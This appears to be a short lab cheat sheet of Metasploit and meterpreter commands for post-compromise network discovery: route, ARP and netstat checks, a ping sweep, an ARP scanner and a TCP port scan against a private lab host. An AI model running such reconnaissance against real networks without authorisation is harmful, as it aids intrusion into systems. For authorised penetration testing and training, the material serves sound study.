#!/bin/bash
# in the meterpreter
routes
arp
netstat -ano

# in msf
use post/multi/gather/ping_sweep
set rhost 192.168.56.111
set session 1
run

use post/windows/gather/arp_scanner
set rhost 192.168.56.111
set session 1
run

# msf
use auxiliary/scanner/portscan/tcp
set rhost 192.168.56.111/32
set ports 20-200
set threads 20
run










